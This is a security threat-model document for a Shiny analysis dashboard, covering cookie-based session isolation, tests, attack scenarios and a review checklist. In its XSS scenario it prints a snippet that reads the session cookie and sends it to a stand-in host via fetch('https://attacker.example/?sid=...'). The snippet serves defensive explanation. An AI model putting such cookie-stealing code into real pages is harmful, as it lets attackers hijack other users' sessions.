# Security model

The dashboard's threat model and the isolation guarantees implemented by F.7 (session resume). This document is for security reviewers and future maintainers asking "how do we know one user can't see another user's results?".

For implementation details, see [`ARCHITECTURE.md`](ARCHITECTURE.md). For deployment-side hardening (NPM, Cloudflare, headers), see [`DEPLOYMENT.md`](DEPLOYMENT.md).

---

## What we defend against

| Threat | Defense |
|---|---|
| User B reading user A's analysis results | F.7 four-layer isolation (sections 1-4 below) |
| User B replaying user A's job IDs | Registry keyed by sid; job IDs are namespace-local, not access tokens |
| Forged websocket messages claiming to be a different user | Server reads sid from the HTTP Cookie header, never from `input$` |
| Brute-force enumeration of sids | 256-bit CSPRNG; 2^256 keyspace |
| Leaked sid via logs / error messages / DOM | Audit tests grep every R/ file for sid references in logging calls |
| Cross-site request forgery (CSRF) | Cookie `SameSite=Strict` blocks cross-site cookie submission |
| Plaintext sid interception | Cookie `Secure` blocks plain-HTTP transmission |

## What we do not defend against

These are intentional limitations of the current design:

| Threat | Why not |
|---|---|
| XSS exfiltrating the sid cookie | The cookie is not HttpOnly because JS sets it client-side. Mitigation strategy: audit user-supplied strings flowing into HTML; set a CSP header at the NPM layer (deferred to a follow-up; tracked) |
| Lost work on container restart | Explicit design choice: in-memory registry, no persistent store. A SQLite-backed registry would survive restart but adds a service dependency. Tracked for a future iteration if the need arises |
| Compromised VPS host | The host is the trust boundary. If the host is compromised, every user's data is exposed. Standard VPS hardening applies (see [`DEPLOYMENT.md`](DEPLOYMENT.md)) |
| Insider threat (someone with shell access on the host) | Same as above |
| Network observer between the user and Cloudflare | Mitigated by HTTPS (Let's Encrypt). Cloudflare-to-origin link is also HTTPS |
| Side-channel timing attacks | Not realistic against the kinds of operations performed (Bayesian fits dominated by Stan; sid lookups in O(1) dictionary access) |
| Malicious file uploads (R-code-as-data) | The dashboard reads CSV / RDA via `utils::read.csv` and `base::load`. RDA files containing executable code could be a risk; mitigated by trust assumption (single-tenant by current cookie scope; multi-tenant relies on the trusted-team assumption) |

---

## The four isolation layers

Multi-user isolation rests on four independent layers. For one user to see another user's job, *every* layer must fail. Each layer is audited by at least one test in `tests/testthat/test-session_isolation.R`.

### Layer 1 — Registry is keyed by sid, lookup-only

The package-level `.job_registry` environment is shaped as:

```r
.job_registry$sessions <- list(
  "<sid_A>" = list(
    "<job_id_1>" = list(kind, status, result, ...),
    "<job_id_2>" = list(...)),
  "<sid_B>" = list(
    "<job_id_3>" = list(...)))
```

Every read API takes `sid` as the first argument:

```r
get_job(sid, job_id)        # lookup
list_jobs(sid)              # enumeration within sid
cancel_job(sid, job_id)     # state change
retire_job(sid, job_id)     # eviction
```

There is no `list_all_jobs()`, no `get_job_by_id_only(job_id)`. If user B calls `get_job("sid_B", "job_id_belonging_to_A")`, the registry returns `NULL` — A's jobs live under `sid_A`, not at the top level.

**Job IDs are never access tokens.** They're indices within an sid's namespace. Two users could (by collision) hold the same job_id and would still see different jobs because the sid bucket comes first.

**Tested by:**
- `test-session_isolation.R::"get_job returns NULL when job_id belongs to a different sid"`
- `test-session_isolation.R::"list_jobs returns only this sid's jobs"`
- `test-session_isolation.R::"list_jobs returns empty list for an unknown sid"`
- `test-session_isolation.R::"get_job rejects malformed sid / job_id inputs"`
- `test-resume_e2e.R::"dispatch_resume cannot pop a job belonging to a different sid"`

### Layer 2 — Server reads cookie from HTTP_COOKIE, not from `input$`

This is the anti-spoofing boundary. A naive design has JavaScript read the cookie and call `Shiny.setInputValue("mE_session_id", value)`. That's forgeable: any user can send a websocket message setting `input$mE_session_id` to a guessed or stolen victim sid.

Instead, the server reads the cookie via:

```r
get_sid <- function(session) {
  cookie_header <- session$request$HTTP_COOKIE %||% ""
  m <- regmatches(cookie_header,
                  regexpr("(?<=mE_session=)[a-f0-9]{64}", cookie_header,
                          perl = TRUE))
  if (length(m) == 1L && nchar(m) == 64L) m else NULL
}
```

`session$request$HTTP_COOKIE` is the literal `Cookie:` header the browser sent — server-side, not user-controlled at the Shiny input layer.

**`input$mE_session_id` is never read by any server code.** JavaScript's only role is to *generate and set* the cookie on first connect when no cookie exists.

The remaining forgery path: a malicious user crafts a raw HTTP request with `Cookie: mE_session=<victim_sid>`. That works only if they know the victim's sid — which brings us to Layer 3.

**Tested by:**
- `test-session_isolation.R::"get_sid parses a well-formed cookie header"`
- `test-session_isolation.R::"get_sid returns NULL for missing header"`
- `test-session_isolation.R::"get_sid rejects malformed cookie values"` — too short / non-hex / wrong cookie name
- `test-session_isolation.R::"get_sid is the only sid source — input$mE_session_id is never read"` — grep audit asserting no R/ file reads that input

### Layer 3 — Sids are unguessable and leak-proof

**Entropy:** 256 bits from `crypto.getRandomValues` (browser CSPRNG) for client-side generation; 256 bits from R's PRNG for server-side fallback (`make_sid()`). Brute-force is computationally infeasible — 2^256 keyspace; even at 10^12 guesses/second the heat death of the universe finishes first.

**Never logged:** `logger::log_info()` calls in the codebase are audited to ensure no `rv$session_id` ever appears in a format string. A grep audit (`test-session_isolation.R::"no R source references rv$session_id in a log_* / message / stop call"`) runs every test cycle.

**Never echoed:** error messages don't include the sid. Banner content doesn't include the sid. Job IDs shown in the UI don't contain the sid.

**Never in URLs:** no GET params, no path segments. The sid stays in the `Cookie` header only — never in places that get captured by referrer headers, browser history, server access logs, NPM logs, or Cloudflare logs.

**Never in `.rds` save files:** the Save/Restore mechanism (`R/mod_log_session.R`) filters out `rv$session_id` before serializing. Restoring an `.rds` file on another machine creates a new sid; it doesn't carry the old one over.

**Not in DOM:** the banner doesn't render `data-sid="…"` anywhere. A user inspecting their own DOM with devtools sees only their own job IDs (which are useless without the sid).

**Cookie attributes:**

| Attribute | Value | Why |
|---|---|---|
| `SameSite` | `Strict` | No cross-site request can submit the cookie |
| `Secure` | (set) | HTTPS only; the browser refuses to transmit on plain HTTP |
| `Path` | `/` | Scoped to this app |
| `Max-Age` | `86400` (24 h) | User re-identifies after a day |
| `HttpOnly` | (not set) | JS needs to read/set the cookie. See "What we don't defend against" |

**Tested by:**
- `test-session_isolation.R::"no R source references rv$session_id in a log_* / message / stop call"` — grep audit across all of R/
- `test-session_isolation.R::"make_sid produces 64 hex chars (unguessable on its own)"`
- `test-resume_banner.R::"banner HTML never contains the sid value"`

### Layer 4 — Future workers can't cross-contaminate

`future::plan(multisession)` runs N persistent worker processes. Workers persist across jobs. If user A's fit and user B's fit run in the same worker (sequentially), the question is: can B's job read anything left over from A's?

- Each `future_promise` evaluates a fresh expression in a fresh function call. The expression only references variables it was explicitly passed via the closure.
- The expression captures `df`, settings, etc. at the parent end. The worker receives serialized copies. Each job's variables live in the function call frame and are eligible for GC when the call returns.
- We don't `eval()` user-supplied strings anywhere. The user-uploaded CSV is read into a data frame; column names and values are passed to ggplot2 / brms via `aes(.data[[col]])` patterns that don't execute user strings as code.

So the worker is a leak vector only if we introduced an `eval()` of user content. We haven't.

**Tested by:** code-pattern conventions enforced by reviewer attention rather than a unit test (writing an `eval()` test that asserts the absence of all dangerous calls is unwieldy). A grep audit could be added in the future:

```bash
grep -rE 'eval[(]|parse[(]' R/ | grep -v '# .*eval'
```

---

## Threat scenarios walked through

### Scenario A: User B knows User A's sid (somehow)

User B reads the cookie value out of their own browser (devtools → Application → Cookies) and somehow obtains user A's sid (perhaps by physical access to A's machine, social engineering, or a system compromise).

User B can then:
1. Open a private/incognito browser session.
2. Manually set the `mE_session` cookie to A's value via JavaScript console.
3. Reload the dashboard.

The dashboard reads the cookie server-side and serves A's banner / jobs / results to B.

**This is by design.** Cookies are bearer tokens. If B has A's cookie, B can act as A. The defenses against this are operational, not architectural:

- 24-hour cookie expiry limits the window
- A more robust cookie can be set in production (shorter expiry / IP-binding) at the cost of UX
- True auth (login, MFA) would defeat this but is out of scope for the current single-tenant / trusted-team model

### Scenario B: User B sends a websocket message claiming to be User A

User B opens devtools → Network → finds the Shiny websocket → manually sends:

```javascript
Shiny.setInputValue("mE_session_id", "<user_A_sid_guess>")
```

The server **never reads `input$mE_session_id`**. The sid is read fresh from `session$request$HTTP_COOKIE` at every observer. B's websocket message has no effect on the server's view of B's sid.

**Tested by Layer 2.**

### Scenario C: User B guesses a sid

User B writes a script to try random 64-hex strings as cookies. Each attempt requires a full HTTPS request.

- At 100 requests/second (rate-limited by the server / Cloudflare), B can try 10^7 sids per day.
- The sid keyspace is 2^256 ≈ 10^77.
- The fraction of the keyspace B can cover in a day is ~10^-70.

The expected time to a single hit is longer than the age of the universe. Even with 1000× more compute, brute-force is infeasible.

**Defended by Layer 3 (entropy).**

### Scenario D: User B finds a sid in a log file

User B has read access to the VPS application logs (perhaps via a misconfigured monitoring tool or a separate compromise).

- The audit test `"no R source references rv$session_id in a log_* / message / stop call"` greps every R/ file for code that logs `session_id`. If anyone introduces such a call, CI fails before merge.
- Application logs DO contain other info (analysis module, anonymized error messages) but never sids.
- Shiny's own per-session token (`session$token`) is unrelated to our sid and changes per-connection; it's safe to log.

**Defended by Layer 3 (leak audit).**

### Scenario E: User B is an active XSS attacker

User B finds an XSS vector in the dashboard — perhaps a user-uploaded CSV with a treatment name containing `<script>...</script>` that ends up unescaped in a plot title.

The injected script runs in user A's browser context. Because the `mE_session` cookie is not `HttpOnly`, the script can read it:

```javascript
document.cookie.match(/mE_session=([a-f0-9]+)/)[1]
```

Then exfiltrate it (e.g., via `fetch("https://attacker.example/?sid=" + sid)`).

**This is the residual risk** noted in "What we don't defend against". Mitigations:

| Mitigation | Status |
|---|---|
| Audit user-supplied strings flowing into HTML | Ongoing. Most ggplot title/subtitle paths go through `htmltools::htmlEscape` automatically. `mod_log_session.R` and `helpers.R` use `paste(...)` constructions that should be reviewed |
| Set `Content-Security-Policy` header at the NPM layer | Deferred to a follow-up. Recommended: `default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; frame-ancestors 'none'` |
| Set `mE_session` cookie HttpOnly via a server-side route | Requires a small httpuv-layer handler bypassing Shiny's standard pattern. Adds ~80 LOC of plumbing. Not done; tracked for a hardening pass |
| Shorten cookie max-age | Trade-off vs UX. Current 24h is a balance |

---

## Audit checklist for code review

When reviewing any PR that touches session handling, cookies, or job registry code, check:

- [ ] No new code reads `input$mE_session_id`
- [ ] No new code reads any input matching `input$.*session` or `input$.*sid`
- [ ] No `log_*` / `message` / `stop` / `warning` / `showNotification` call includes `session_id` in its arguments
- [ ] No render output includes `rv$session_id` in HTML / text
- [ ] No URL parameter (GET, path segment) carries an sid
- [ ] No CSV / JSON / RDA export written via the dashboard includes an sid
- [ ] Any new resume kind is registered via `register_resume_handler()` so the dispatcher routes it
- [ ] Any new background-future call goes through `launch_job()` (not raw `future_promise` outside the registry)
- [ ] The four-layer audit tests in `test-session_isolation.R` all pass

For F.7 specifically:

- [ ] If you change cookie attributes in `inst/www/js/session-id.js`, update `R/session_identity.R` regex and `docs/SECURITY.md`
- [ ] If you change the cookie name, update both files plus `test-session_isolation.R`
- [ ] If you change `.job_registry` structure, ensure `get_job` / `list_jobs` / `cancel_job` still take sid first

---

## Reporting a vulnerability

Suspected vulnerabilities should be reported privately to david@sciomics.bio. Do not open a public issue. We'll acknowledge within 48 hours and provide a fix timeline based on severity.

If the vulnerability allows cross-user data access (any breach of the four isolation layers), it's critical priority.

---

## See also

- [`ARCHITECTURE.md`](ARCHITECTURE.md) — the F.7 layer's implementation overview
- [`DEPLOYMENT.md`](DEPLOYMENT.md) — operational hardening (HTTPS, CSP, NPM config)
- `R/job_registry.R` — registry implementation
- `R/session_identity.R` — cookie reader
- `tests/testthat/test-session_isolation.R` — the security-critical audit suite
- `CODE_REVIEW.md` (repo root) — Round 2 F.7 entry; context for why the design choices were made
